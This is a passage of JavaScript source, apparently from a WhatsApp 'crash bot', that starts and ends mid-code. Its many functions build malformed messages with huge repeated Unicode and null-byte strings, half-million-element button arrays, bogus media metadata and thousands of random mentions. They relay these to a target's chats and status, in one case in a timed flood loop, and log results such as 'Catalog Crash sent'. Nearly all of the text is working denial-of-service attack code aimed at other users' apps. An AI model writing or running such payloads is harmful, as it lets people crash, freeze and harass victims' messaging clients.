            buttonParamsJson: "{}"
          }],
          messageParamsJson: "{}"
        },
        contextInfo: {
          quotedMessage: {
            contactMessage: {
              displayName: "Wazap Bvg",
              vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;wazapbvg;;;\nFN:wazapbvg\nEND:VCARD`,
              contextInfo: {
                forwardingScore: 0,
                isForwarded: true,
                forwardOrigin: "META_AI"
              }
            }
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "biz",
        attrs: {
          native_flow_name: "catalog_message"
        }
      }]
    });
    
    console.log(`[✅] Catalog Crash sent to ${groupJid}`);
    return true;
    
  } catch (err) {
    console.log(`[❌] Catalog Crash gagal ke ${groupJid}: ${err.message}`);
    return false;
  }
}

async function xofm(sock, target) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "ี".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\{".repeat(9999),
                buttons: "ี".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {});
    
    await sock.chatModify({
      delete: true,
      lastMessages: [{
        key: {
          remoteJid: target,
          fromMe: true,
          id: msg.key.id
        },
        messageTimestamp: Date.now()
      }]
    }, target);
  }
}

async function unknowbuts(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            },
            body: {
              text: "\x10".repeat(5000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    },
    {
      participant: true
    }
  );
}

async function fcmessages(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        title: "\u0001",
        subtitle: "\u0001",
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: 1,
          degreesLongitude: 1,
          name: "\u0001",
          address: "\u0001",
          jpegThumbnail: Buffer.alloc(10000, 'a').toString('base64')
        }
      },
      body: {
        text: "\u0001"
      },
      footer: {
        text: "\u0001"
      },
      contextInfo: {
        mentionedJid: target,
        isForwarded: true,
        externalAdReply: {
          title: " - # SixEyesXCrashèr ん. ",
          body: "\u0001",
          thumbnailUrl: "https://i.imgur.com/xxx.jpg",
          sourceUrl: "https://t.me/xeternalz_info",
          mediaType: 1,
          renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterName: "- # SixEyesXCrashèr ん.",
          newsletterJid: "0@newsletter",
          serverMessageId: 143
        },
        businessMessageForwardInfo: {
          businessOwnerJid: "0@s.whatsapp.net"
        }
      }, 
      nativeFlowMessage: {
        buttons: [
          { name: 'catalog_message', buttonParamsJson: JSON.stringify({}) },
          { name: 'booking_status', buttonParamsJson: JSON.stringify({}) },
          { name: 'review_and_pay', buttonParamsJson: `{}` },
          { name: 'payment_requested', buttonParamsJson: `{}` }
        ], 
        messageParamsJson: '{}',
      }
    }
  }, {
    participant: true, 
    additionalNodes: [
      { tag: 'biz', attrs: { native_flow_name: 'catalog_message' } }
    ]
  });
}

async function xlocCLog(sock, target) {
  await sock.relayMessage(target,
    {
      interactiveMessage: {
        header: {
          title: "- # SixEyesXCrashèr ん.",
          subtitle: "\0",
          hasMediaAttachment: true,
          locationMessage: {
            degreesLatitude: -0,
            degreesLongitude: 0,
            name: "\u0000",
            jpegThumbnail: "xeternalz_info.t.me",
          },
        },
        body: {
          text: "\u0000",
        },
        footer: {
          text: "- # SixEyesXCrashèr ん.",
        },
        contextInfo: {
          mentionedJid: [target],
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: "@ん.",
            body: "   ~  \"how can i move on when i'm still in love with you\"  ~   ",
            thumbnailUrl: "https://files.catbox.moe/ur8m20.jpg",
            sourceUrl: "https://t.me/xeternalz_info",
            mediaType: 1,
            renderLargerThumbnail: true,
          },
          forwardedNewsletterMessageInfo: {
            newsletterName: "- # SixEyesXCrashèr ん.",
            newsletterJid: "1@newsletter",
            serverMessageId: 1,
          },
          businessMessageForwardInfo: {
            businessOwnerJid: target,
          },
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "catalog_message",
              buttonParamsJson: "{}",
            },
            {
              name: "call_permission_request",
              buttonParamsJson: "{}",
            }
          ],
          messageParamsJson: "{}",
        },
      },
    },
    {
      participant: true,
      additionalNodes: [
        {
          tag: "biz",
          attrs: {
            native_flow_name: "catalog_message",
          },
        },
      ],
    }
  );
}

async function iosCtt(sock, target) {
  await sock.relayMessage(target, {
    contactMessage: {
      displayName:
        "- # SixEyesXCrashèr ん. " +
        "𑇂𑆵𑆴𑆿".repeat(10000),
      vcard: `BEGIN:VCARD
VERSION:3.0
N:;𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)};;;
FN:𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)}
NICKNAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
ORG:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
TITLE:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item1.TEL;waid=6287873499996:+62 878-7349-9996
item1.X-ABLabel:Telepon
item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item2.X-ABLabel:Kantor
item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item3.X-ABLabel:Kantor
item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item4.X-ABLabel:Pribadi
item5.ADR:;;𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)};;;;
item5.X-ABADR:ac
item5.X-ABLabel:Rumah
X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
PHOTO;${null}
X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
END:VCARD`,
      contextInfo: {
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\u0000".repeat(100000),
          greetingMessageBody: "- # SixEyesXCrashèr ん.",
        },
      },
    },
  }, {
    participant: true,
  });
}
async function Delayultimate (sock, target) {
    try {
        const s = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "༑⌁⃰𝐒𝐮𝐤𝐢ཀ‌‌#ᛉ"
                        },
                        nativeFlowMessage: {
                            buttons: "\u001A".repeat(500000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, s, {});
        
        const u = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000".repeat(500000)
                        }
                    }
                }
            }
        };

        const k = {
            interactiveMessage: {
                body: {
                    text: "༑⌁⃰𝐒𝐮𝐤𝐢ཀ‌‌#ᛉ"
                },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            }
        };

       
        await sock.relayMessage(target, u, {});


        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "\u0000".repeat(200000),
                            title: "\u0000".repeat(200000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(500000),
                            version: 3
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        });

        
        await sock.relayMessage(target, k, {});

        console.log("success send to target");

    } catch (err) {
        console.error("Error:", err);
    }
}
async function DelayInvisible(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '12345678@newsletter',
                    newsletterName: 'SixEyesX CRASHER' + 'ោ៝'.repeat(7500),
                    caption: 'SixEyesX CRASHER' + 'ោ៝'.repeat(7500),
                    inviteExpiration: Date.now() + 1814400000,
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            '0@s.whatsapp.net',
                            ...Array.from({ length: 1900 }, () =>
                                '1' + Math.floor(Math.random() * 5000000) + '@s.whatsapp.net'
                            )
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimestamp: Date.now() + 1814400000
                            },
                            forwardedAiBotMessageInfo: {
                                number_999999: "DATA_MEDIA",
                                botName: 'olaa hanz',
                                botJid: Math.floor(Math.random() * 5000000) + '@s.whatsapp.net',
                                creatorName: 'Kelz is here',
                                liveLocationMessage: {
                                    degreesLatitude: -1e309,
                                    degreesLongitude: 1e309,
                                    accuracyInMeters: 999999999,
                                    speedInMps: 1,
                                    degreesClockwiseFromMagneticNorth: 999999999,
                                    caption: "\u0000".repeat(50000),
                                    sequenceNumber: 999999999,
                                    timeOffset: Date.now()
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {});
}

async function fcGrup(sock, target) {
  const Msg1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "hai i am omega ᙭",
            format: "NONE"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(15000),   
            version: 3
          },
          contextInfo: {
            participant: target,
            remoteJid: groupJid,
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: "PAYMENT_INVITE",
                expiryTimestamp: 9999999999       
              }
            },
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 9999
          }
        }
      }
    },
    futureProofMessage: {
      version: 999,
      message: {
        text: "\u0000".repeat(50000)
      }
    }
  };

  const Omek = await sock.generateWAMessageFromContent(groupJid, Msg1, {});

  await sock.relayMessage(
    groupJid, 
    Omek.message, 
    {
      messageId: Omek.key.id
    }
  );
}

async function crashX(sock, target) {
    const MakLo = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "Zero'X",
                                rows: "\0",
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, MakLo, {});

    await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
    });
}

async function docthumb(sock, target) {
  const pnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐙͜𝐄͓᪳𝐑𝐎'𝐗 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1073741824000000",
              pageCount: 9007199254740991 * 9999,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐙͜𝐄͓᪳𝐑𝐎'𝐗 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐙͜𝐄͓᪳𝐑𝐎'𝐗 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
          },
          contextInfo: {
            remoteJid: "X",
            participant: sock.user.id,
            mentionedJid: [target, "13135550002@s.whatsapp.net",],
            quotedMessage: {},
          },
          nativeFlowMessage: {
            messageParamsJson: "{",
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "💣⃟༑Zero'X ͯཀ͜͡🪅-‣" + "\u0000".repeat(35000),
                  "flow_message_version": "3"
                })
              },
            ]
          }
        }
      }
    },
    participant: { jid: target }
  };

  const pnxMessage = generateWAMessageFromContent(
    target,
    proto.Message.fromObject(pnx),
    {
      userJid: target
    }
  );
  await sock.relayMessage(target, pnxMessage.message,
    {
      messageId: pnxMessage.key.id
    }
  );
}

async function FrezeChatBum(sock, target) {
const CrBZB = {
interactiveMessage: {
body: {
text: "Zero'X"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
albumMessage: {
expectedImageCount: 9999,
expectedVideoCount: 9999
},
},
},
},
};

const CrbB = generateWAMessageFromContent(target, CrBZB, {});

await sock.relayMessage(target, CrbB.message, {
participant: true,
messageId: CrbB.key.id
})
}

async function FrezeBum(sock, target) {
const CrBZA = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "Zero'X"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
albumMessage: {
expectedImageCount: 9999,
expectedVideoCount: 9999
},
},
},
},
},
},
};

const CrbA = generateWAMessageFromContent(target, CrBZA, {});

await sock.relayMessage(target, CrbA.message, {
participant: true,
messageId: CrbA.key.id
})
}

async function Blank(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Zero'X + \u999b".repeat(99999)
          },
          nativeFlowMessage: {
            buttons: [{
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦽ".repeat(50000),
                id: "ြ".repeat(50000)
              })
            }]
          },
          contextInfo: {
            mentionedJid: ["status@broadcast"]
          }
        }
      }
    }
  };

  const Zenz = ZenzWAMessageFromContent(target, msg, {});

  await sock.relayMessage(target, Zenz.message, {
    participant: true,
    messageId: Zenz.key.id
  });
}

async function executedV10Back(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "Zero'X",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `Zero'X`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "Zero'X",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQJp84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "Zero'X",
                                fileName: "Zero'X - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: null }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: null }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 3 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: true });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: true });

    await sock.relayMessage(
        target,
        {
            interactiveMessage: {
                body: {
                    title: "Zero'X" + "ြ".repeat(7500),
                    hasMediaAttachment: true,
                    text: "Zero'X",
                },
                nativeFlowMessage: {
                    buttons: "\x10".repeat(9000),
                },
            },
        },
        {
            participant: true,
        }
    );

    await new Promise(resolve => setTimeout(resolve, 900));

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Zero'X¿!",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "\u0003".repeat(75000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: true });
    
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Zero'X¿!",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(9000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: true });

    const acaaMsg = {
        groupStatusMessageV2: { 
          message: {
            interactiveMessage: {
              body: {
                text: "RayAkyzen - ¿!"
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 50000 }, () => ({}))
              },
              contextInfo: {
                quotedMessage: {
                  albumMessage: {
                    expectedImageCount: 75000,
                    expectedVideoCount: 75000
                  },
                },
              },
            },
          },
        },
    };

    await sock.relayMessage(target, {
        richMessage: {
          title: "👁‍🗨⃟꙰Zero'X - Executed¿!",
          text: "Zero'X¿!",
          code: {
            language: "javascript",
            code: `var lex = "ြ".repeat(75000);\n var acaa = ""👁‍🗨⃟꙰RayAkyzen - CursedXNexus"`
          },
        productSingle: {
          title: 'RayAkyzen',
          brand: "ြ".repeat(9000),
          price: '50k',
          sale_price: '45k',
          product_url: 't.me/RayAkyzen',
          image: { url: 'https://example.com/image.jpg' },
          additional_images: [{ url: 'https://example.com/image.jpg' }]
        },
          productMultiple: Array.from({ length: 10 }, (_, i) => ({
            title: "ြ".repeat(10000),
            brand: "ြ".repeat(9000),
            price: null,
            sale_price: String((i + 1) * 40),
            product_url: "t.me/RayAkyzen",
            image: { url: null },
            additional_images: [{ url: "" }]
          })),
        reels: [
          {
            title: "LexzyModsXacaaluxxmrktt",
            profileIconUrl: 'https://example.com/image.jpg',
            thumbnailUrl: 'https://example.com/image.jpg',
            videoUrl: 'https://example.com/video.mp4',
            reels_title: "👁‍🗨⃟꙰Zero'X¿!",
            likes_count: -1,
            shares_count: 9999,
            view_count: 99999,
            reel_source: 'IG',
            is_verified: true
          }
        ]
        }
      }, { participant: true });

